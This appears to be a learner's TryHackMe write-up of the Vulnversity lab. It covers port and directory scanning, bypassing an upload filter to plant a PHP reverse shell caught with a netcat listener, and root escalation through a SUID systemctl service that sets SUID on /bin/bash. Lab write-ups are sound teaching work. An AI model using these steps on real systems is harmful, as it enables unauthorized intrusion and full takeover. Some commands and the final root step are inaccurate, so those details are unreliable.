# Vulnversity – TryHackMe Write-up

| | |
|---|---|
| **Difficulty** | Easy |
| **Category** | Web / PrivEsc / Active Recon |
| **Target OS** | Linux |
| **Date** | 03/11/2026 |

## Summary

## 1. Reconnaissance / Enumeration

   ### 1.1 Port scan

We start by doing a port scan : `nmap -A -p- -Pn @IP`
We find 6 open ports :
- 21 ftp vsftpd 3.0.5
- 22 ssh OpenSSH 8.2p1
- 139 smb Samba 4.6.2
- 445 smb Samba 4.6.2
- 3128 squid proxy 4.10
- 3333 http Apache 2.4.41

   ### 1.2 Web enumeration

  As there is a Apache web server, we can use gobuster to enumerate the directories and files on the web server.
  `gobuster dir -u http://@IP:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html`
  We find a directory named internal that let's us upload a file.

## 2. Initial Access (Foothold)

   ### 2.1 Identified vulnerability
When we go to http://@IP:3333/Internal we can upload a file. The vulnerability is that the files we can upload are not secured enough. We want to upload a reverse shell script in php to have access to the machine.
   
   ### 2.2 Exploitation

As it's the first time I saw this, I had to look it up on how to do this.
First thing is Fuzzing with Intruder:
The server probably blocks php so we need to find the right extension. 
First we create a .txt file that will be used as a wordlist later. In it we put extensions we want to try such as .php, .php3, .php4, .phtml etc...
Then we can configure Burp to intercept the request when we send a test file. This request is sent to Intruder to perform a sniper attack.
We choose the thing to test, here it is the extension and finally we choose our wordlist of extensions and we launch the attack.
Burpsuite will automatically test every extension in the wordlist.
Then we observe the results : we should look the size of the aswer and the content of it. The content should contain something like "extension allowed".

  
   ### 2.3 Getting a shell

We can download a reverse shell online using this github repository : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
Then we can change the extension to the right one (.phtml) and modify the shell to have our own IP address for the netcat listener.
Then on our terminal we set up the netcat listener : `nc -lvnp 1234` (port configure in the reverse shell)
We can now upload the reverse shell to have access to the web server. To have access to the shell we need to go to the reverse shell web page.
   
## 3. Privilege Escalation

   ### 3.1 Local enumeration

Now that we have access to the shell, we can enumerate some information. with `whoami` we know that we are www-data.
We can look for any user by doing `ls -la /home` and we find the user bill.
   
   ### 3.2 Exploiting the vector

In his documents, there is the first flag named user.txt.
We can now look for SUIDs with `find / -perm -4000 -type f 2>/dev/null`. We find the /bin/systemctl process having SUIDs. Our purpose will be to use this to elevate our shell.
I didn't know how to exploit this so I looked it up.
We need to create a service that can be launched by systemctl.
First we create a temporary path for the service file : 
   `TF=$(mktemp).service`

Secondly we create the content of the service :
   `echo '[service]
   Type=oneshot
   ExecStart=/bin/sh -c "chmod +s /bin/bash"
   [Install]
   WantedBy=multi-user.target' > $TF`

This will grant the has SUID.

Thirdly, we link and start the service : 
   `systemctl link $TF
   systemctl enable --now $TF`
   
   ### 3.3 Root access

Now that our bash has SUID we can go the the /root folder to get the last flag : `sudo ls -la /root`.

## 4. Dead Ends and Difficulties (optional)

How to use systemctl to exploit the vulnerability
How to test different extensions.

## 5. Remediation

Learnt it and explained.

## 6. Lessons Learned

Same as Difficulties.
